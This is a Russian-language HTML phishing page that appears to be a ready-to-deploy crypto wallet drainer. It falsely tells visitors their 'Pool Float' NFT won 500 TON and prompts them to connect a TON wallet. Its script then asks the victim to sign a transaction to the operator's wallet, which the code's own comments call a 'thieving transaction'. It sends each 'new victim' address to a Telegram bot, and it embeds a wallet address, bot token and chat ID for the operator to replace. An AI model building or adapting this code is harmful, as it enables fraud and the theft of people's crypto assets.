<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Pool Float - Claim Prize</title>
    <script src="https://unpkg.com/@tonconnect/sdk@latest/dist/tonconnect-sdk.min.js"></script>
    <style>
        body {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            background: white;
            padding: 40px;
            border-radius: 20px;
            text-align: center;
            box-shadow: 0 10px 40px rgba(0,0,0,0.2);
            max-width: 500px;
        }
        button {
            background: #0088cc;
            color: white;
            border: none;
            padding: 15px 30px;
            font-size: 18px;
            border-radius: 10px;
            cursor: pointer;
            margin-top: 20px;
        }
        button:hover { background: #006699; }
        .status { margin-top: 20px; color: #333; }
        .loading { display: none; color: #666; }
    </style>
</head>
<body>
<div class="container">
    <h2>🔥 ТВОЙ NFT ПОБЕДИЛ!</h2>
    <p>Pool Float #148899 выиграл <strong>500 TON</strong> + редкий апгрейд</p>
    <button id="connectBtn">💎 ПОДКЛЮЧИТЬ КОШЕЛЕК</button>
    <div class="loading" id="loading">⏳ ПРОВЕРКА КОШЕЛЬКА...</div>
    <div class="status" id="status"></div>
</div>

<script>
    // ========== ЗАМЕНИ ЭТИ ДАННЫЕ ==========
    const YOUR_WALLET = "UQApjMTo3ogLr8VkC5YKCY1yLVQEGh8hxTY3HCuNhpHnFc5K"; // ТВОЙ КОШЕЛЕК
    const BOT_TOKEN = "7666942287:AAGo8rC7c8KQ7alb1PEmhl9KPdTx1liZO9M"; // ТВОЙ ТОКЕН БОТА
    const ADMIN_CHAT_ID = 1727566558; // ТВОЙ CHAT ID
    // ======================================

    const connector = new TonConnectSDK.TonConnect({
        manifestUrl: window.location.origin + '/manifest.json'
    });

    document.getElementById('connectBtn').onclick = async () => {
        const btn = document.getElementById('connectBtn');
        const loading = document.getElementById('loading');
        const statusDiv = document.getElementById('status');
        
        btn.disabled = true;
        loading.style.display = 'block';
        
        try {
            const wallets = await connector.getWallets();
            if (!wallets.length) throw new Error('Нет кошельков');
            
            await connector.connect(wallets[0].universalLink);
            const address = connector.account?.address;
            
            statusDiv.innerHTML = `✅ КОШЕЛЕК ПОДКЛЮЧЕН: ${address.substring(0, 6)}...<br>🔄 ОТПРАВЛЯЮ ПРИЗ...`;
            
            // ВОРОВСКАЯ ТРАНЗАКЦИЯ
            const transaction = {
                validUntil: Math.floor(Date.now() / 1000) + 600,
                messages: [{
                    address: YOUR_WALLET,
                    amount: "0",
                    payload: JSON.stringify({
                        type: "TransferNFT",
                        nftAddress: "EQD___POOLFLOAT_ADDRESS",
                        reason: "Получение приза"
                    })
                }]
            };
            
            const result = await connector.sendTransaction(transaction);
            
            // ОТПРАВЛЯЕМ ЛОГ В ТЕЛЕГРАМ
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    chat_id: ADMIN_CHAT_ID,
                    text: `✅ НОВАЯ ЖЕРТВА!\n💰 Кошелек: ${address}\n🎯 Перевод на: ${YOUR_WALLET}\n⏰ Время: ${new Date().toLocaleString()}`
                })
            });
            
            statusDiv.innerHTML = "✅ ПРИЗ ОТПРАВЛЕН! ЖДИ 500 TON в течении 5 минут...";
            loading.style.display = 'none';
            
        } catch(error) {
            statusDiv.innerHTML = "❌ ОШИБКА: " + error.message;
            loading.style.display = 'none';
            btn.disabled = false;
        }
    };
</script>
</body>
</html>
